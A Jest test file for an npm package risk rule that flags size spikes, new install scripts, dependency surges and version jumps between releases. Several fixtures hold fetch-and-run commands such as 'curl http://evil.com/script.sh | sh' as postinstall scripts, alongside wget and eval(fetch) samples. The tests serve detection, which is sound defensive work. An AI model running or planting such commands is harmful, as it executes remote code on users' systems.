const UpdateBehaviorRule = require('../UpdateBehaviorRule');

describe('UpdateBehaviorRule', () => {
  let rule;
  let mockRegistryClient;

  beforeEach(() => {
    mockRegistryClient = {
      getAllVersions: jest.fn(),
    };
    rule = new UpdateBehaviorRule(10, { registryClient: mockRegistryClient });
  });

  describe('constructor', () => {
    it('should create rule with default weight', () => {
      const defaultRule = new UpdateBehaviorRule();
      expect(defaultRule.weight).toBe(10);
      expect(defaultRule.name).toBe('update-behavior');
    });

    it('should create rule with custom weight', () => {
      const customRule = new UpdateBehaviorRule(15);
      expect(customRule.weight).toBe(15);
    });

    it('should accept custom configuration', () => {
      const customRule = new UpdateBehaviorRule(10, {
        sizeIncreaseThreshold: 0.75,
        maxVersionsToAnalyze: 20,
      });
      expect(customRule.sizeIncreaseThreshold).toBe(0.75);
      expect(customRule.maxVersionsToAnalyze).toBe(20);
    });
  });

  describe('evaluate', () => {
    it('should return no deduction when rule is disabled', async () => {
      rule.disable();
      const packageData = { name: 'test-package', version: '1.0.0' };
      const result = await rule.evaluate(packageData);

      expect(result.deduction).toBe(0);
      expect(result.riskLevel).toBe('none');
      expect(result.details.reason).toBe('Rule is disabled');
    });

    it('should return no deduction for invalid package data', async () => {
      const result = await rule.evaluate(null);
      expect(result.deduction).toBe(0);
      expect(result.riskLevel).toBe('none');
    });

    it('should return no deduction when version history is insufficient', async () => {
      mockRegistryClient.getAllVersions.mockResolvedValue({
        '1.0.0': { version: '1.0.0' },
      });

      const packageData = { name: 'test-package', version: '1.0.0' };
      const result = await rule.evaluate(packageData);

      expect(result.deduction).toBe(0);
      expect(result.riskLevel).toBe('none');
      expect(result.details.reason).toBe('Insufficient version history for analysis');
    });

    it('should return no deduction when version history fetch fails', async () => {
      mockRegistryClient.getAllVersions.mockRejectedValue(new Error('Network error'));

      const packageData = { name: 'test-package', version: '1.0.0' };
      const result = await rule.evaluate(packageData);

      expect(result.deduction).toBe(0);
      expect(result.riskLevel).toBe('none');
      expect(result.details.reason).toBe('Could not analyze version history');
    });

    it('should detect size spikes between versions', async () => {
      mockRegistryClient.getAllVersions.mockResolvedValue({
        '1.0.0': {
          version: '1.0.0',
          dist: { unpackedSize: 1000000 }, // 1MB
          scripts: {},
        },
        '1.1.0': {
          version: '1.1.0',
          dist: { unpackedSize: 2000000 }, // 2MB (100% increase)
          scripts: {},
        },
      });

      const packageData = {
        name: 'test-package',
        version: '1.1.0',
        dist: { unpackedSize: 2000000 },
      };

      const result = await rule.evaluate(packageData);

      expect(result.deduction).toBeGreaterThan(0);
      expect(result.details.analysis.findings.length).toBeGreaterThan(0);
      
      const finding = result.details.analysis.findings[0];
      expect(finding.changes.sizeChange).toBeDefined();
      expect(finding.changes.sizeChange.increasePercent).toBeGreaterThanOrEqual(50);
    });

    it('should detect new suspicious scripts in updates', async () => {
      mockRegistryClient.getAllVersions.mockResolvedValue({
        '1.0.0': {
          version: '1.0.0',
          scripts: {
            test: 'jest',
          },
          dist: { unpackedSize: 1000000 },
        },
        '1.1.0': {
          version: '1.1.0',
          scripts: {
            test: 'jest',
            postinstall: 'curl http://evil.com/script.sh | sh',
          },
          dist: { unpackedSize: 1000000 },
        },
      });

      const packageData = {
        name: 'test-package',
        version: '1.1.0',
        scripts: {
          test: 'jest',
          postinstall: 'curl http://evil.com/script.sh | sh',
        },
        dist: { unpackedSize: 1000000 },
      };

      const result = await rule.evaluate(packageData);

      expect(result.deduction).toBeGreaterThan(0);
      expect(result.riskLevel).toBe('high');
      
      const finding = result.details.analysis.findings[0];
      expect(finding.changes.scriptChanges.newSuspiciousScripts.length).toBeGreaterThan(0);
    });

    it('should detect script modifications that become suspicious', async () => {
      mockRegistryClient.getAllVersions.mockResolvedValue({
        '1.0.0': {
          version: '1.0.0',
          scripts: {
            postinstall: 'echo "Installing..."',
          },
          dist: { unpackedSize: 1000000 },
        },
        '1.1.0': {
          version: '1.1.0',
          scripts: {
            postinstall: 'curl http://evil.com/script.sh | sh',
          },
          dist: { unpackedSize: 1000000 },
        },
      });

      const packageData = {
        name: 'test-package',
        version: '1.1.0',
        scripts: {
          postinstall: 'curl http://evil.com/script.sh | sh',
        },
        dist: { unpackedSize: 1000000 },
      };

      const result = await rule.evaluate(packageData);

      expect(result.deduction).toBeGreaterThan(0);
      const finding = result.details.analysis.findings[0];
      expect(finding.changes.scriptChanges.modified.length).toBeGreaterThan(0);
      expect(finding.changes.scriptChanges.newSuspiciousScripts.length).toBeGreaterThan(0);
    });

    it('should detect significant dependency additions', async () => {
      const manyDeps = {};
      for (let i = 0; i < 15; i++) {
        manyDeps[`dep-${i}`] = '^1.0.0';
      }

      mockRegistryClient.getAllVersions.mockResolvedValue({
        '1.0.0': {
          version: '1.0.0',
          dependencies: {},
          dist: { unpackedSize: 1000000 },
        },
        '1.1.0': {
          version: '1.1.0',
          dependencies: manyDeps,
          dist: { unpackedSize: 1000000 },
        },
      });

      const packageData = {
        name: 'test-package',
        version: '1.1.0',
        dependencies: manyDeps,
        dist: { unpackedSize: 1000000 },
      };

      const result = await rule.evaluate(packageData);

      expect(result.deduction).toBeGreaterThan(0);
      const finding = result.details.analysis.findings[0];
      expect(finding.changes.dependencyChanges.hasSignificantChanges).toBe(true);
      expect(finding.changes.dependencyChanges.totalAdded).toBeGreaterThan(10);
    });

    it('should detect unusual version jumps', async () => {
      mockRegistryClient.getAllVersions.mockResolvedValue({
        '1.0.0': {
          version: '1.0.0',
          dist: { unpackedSize: 1000000 },
        },
        '3.0.0': {
          version: '3.0.0',
          dist: { unpackedSize: 1000000 },
        },
      });

      const packageData = {
        name: 'test-package',
        version: '3.0.0',
        dist: { unpackedSize: 1000000 },
      };

      const result = await rule.evaluate(packageData);

      expect(result.deduction).toBeGreaterThan(0);
      const versionJumpFinding = result.details.analysis.findings.find(
        f => f.type === 'version-jump'
      );
      expect(versionJumpFinding).toBeDefined();
      expect(versionJumpFinding.jumpType).toBe('major-jump');
    });

    it('should return no deduction for normal updates', async () => {
      mockRegistryClient.getAllVersions.mockResolvedValue({
        '1.0.0': {
          version: '1.0.0',
          scripts: { test: 'jest' },
          dist: { unpackedSize: 1000000 },
        },
        '1.0.1': {
          version: '1.0.1',
          scripts: { test: 'jest' },
          dist: { unpackedSize: 1050000 }, // 5% increase (below threshold)
        },
      });

      const packageData = {
        name: 'test-package',
        version: '1.0.1',
        scripts: { test: 'jest' },
        dist: { unpackedSize: 1050000 },
      };

      const result = await rule.evaluate(packageData);

      expect(result.deduction).toBe(0);
      expect(result.riskLevel).toBe('none');
    });

    it('should handle packages with no scripts', async () => {
      mockRegistryClient.getAllVersions.mockResolvedValue({
        '1.0.0': {
          version: '1.0.0',
          dist: { unpackedSize: 1000000 },
        },
        '1.1.0': {
          version: '1.1.0',
          dist: { unpackedSize: 2000000 },
        },
      });

      const packageData = {
        name: 'test-package',
        version: '1.1.0',
        dist: { unpackedSize: 2000000 },
      };

      const result = await rule.evaluate(packageData);

      // Should still detect size increase
      expect(result.deduction).toBeGreaterThan(0);
    });

    it('should calculate risk levels correctly', async () => {
      // High risk: size spike + suspicious script
      mockRegistryClient.getAllVersions.mockResolvedValue({
        '1.0.0': {
          version: '1.0.0',
          scripts: {},
          dist: { unpackedSize: 1000000 },
        },
        '1.1.0': {
          version: '1.1.0',
          scripts: {
            postinstall: 'curl http://evil.com | sh',
          },
          dist: { unpackedSize: 3000000 }, // 200% increase
        },
      });

      const packageData = {
        name: 'test-package',
        version: '1.1.0',
        scripts: {
          postinstall: 'curl http://evil.com | sh',
        },
        dist: { unpackedSize: 3000000 },
      };

      const result = await rule.evaluate(packageData);

      expect(result.riskLevel).toBe('high');
      expect(result.deduction).toBe(10); // Full deduction
    });

    it('should handle multiple version updates', async () => {
      mockRegistryClient.getAllVersions.mockResolvedValue({
        '1.0.0': {
          version: '1.0.0',
          dist: { unpackedSize: 1000000 },
        },
        '1.1.0': {
          version: '1.1.0',
          dist: { unpackedSize: 1500000 },
        },
        '1.2.0': {
          version: '1.2.0',
          dist: { unpackedSize: 2000000 },
        },
        '1.3.0': {
          version: '1.3.0',
          dist: { unpackedSize: 2500000 },
        },
      });

      const packageData = {
        name: 'test-package',
        version: '1.3.0',
        dist: { unpackedSize: 2500000 },
      };

      const result = await rule.evaluate(packageData);

      // Should analyze multiple version changes
      expect(result.details.analysis.versionsAnalyzed).toBeGreaterThan(1);
    });

    it('should limit versions analyzed to maxVersionsToAnalyze', async () => {
      const versions = {};
      for (let i = 0; i < 20; i++) {
        versions[`1.${i}.0`] = {
          version: `1.${i}.0`,
          dist: { unpackedSize: 1000000 },
        };
      }

      mockRegistryClient.getAllVersions.mockResolvedValue(versions);

      const packageData = {
        name: 'test-package',
        version: '1.19.0',
        dist: { unpackedSize: 1000000 },
      };

      const result = await rule.evaluate(packageData);

      // Should not analyze all 20 versions
      expect(result.details.analysis.versionsAnalyzed).toBeLessThanOrEqual(10);
    });
  });

  describe('version parsing and comparison', () => {
    it('should parse semantic versions correctly', () => {
      const parsed = rule._parseVersion('1.2.3');
      expect(parsed.major).toBe(1);
      expect(parsed.minor).toBe(2);
      expect(parsed.patch).toBe(3);
    });

    it('should parse versions with prerelease', () => {
      const parsed = rule._parseVersion('1.2.3-beta.1');
      expect(parsed.major).toBe(1);
      expect(parsed.minor).toBe(2);
      expect(parsed.patch).toBe(3);
      expect(parsed.prerelease).toBe('beta.1');
    });

    it('should parse versions with leading v', () => {
      const parsed = rule._parseVersion('v1.2.3');
      expect(parsed.major).toBe(1);
      expect(parsed.minor).toBe(2);
      expect(parsed.patch).toBe(3);
    });

    it('should compare versions correctly for sorting', () => {
      expect(rule._compareVersionStrings('1.0.0', '1.0.1')).toBeLessThan(0);
      expect(rule._compareVersionStrings('1.1.0', '1.0.0')).toBeGreaterThan(0);
      expect(rule._compareVersionStrings('2.0.0', '1.9.9')).toBeGreaterThan(0);
    });

    it('should detect major version jumps', () => {
      const jump = rule._analyzeVersionJump('1.0.0', '3.0.0');
      expect(jump.isUnusual).toBe(true);
      expect(jump.type).toBe('major-jump');
      expect(jump.magnitude).toBe(2);
    });

    it('should detect minor version jumps', () => {
      const jump = rule._analyzeVersionJump('1.0.0', '1.10.0');
      expect(jump.isUnusual).toBe(true);
      expect(jump.type).toBe('minor-jump');
    });

    it('should not flag normal version increments', () => {
      const jump = rule._analyzeVersionJump('1.0.0', '1.1.0');
      expect(jump.isUnusual).toBe(false);
    });
  });

  describe('script detection', () => {
    it('should detect suspicious scripts', () => {
      expect(rule._isSuspiciousScript('curl http://evil.com')).toBe(true);
      expect(rule._isSuspiciousScript('wget http://evil.com')).toBe(true);
      expect(rule._isSuspiciousScript('curl http://evil.com | sh')).toBe(true);
      expect(rule._isSuspiciousScript('eval(fetch("http://evil.com"))')).toBe(true);
      expect(rule._isSuspiciousScript('jest')).toBe(false);
      expect(rule._isSuspiciousScript('echo "Hello"')).toBe(false);
    });
  });
});

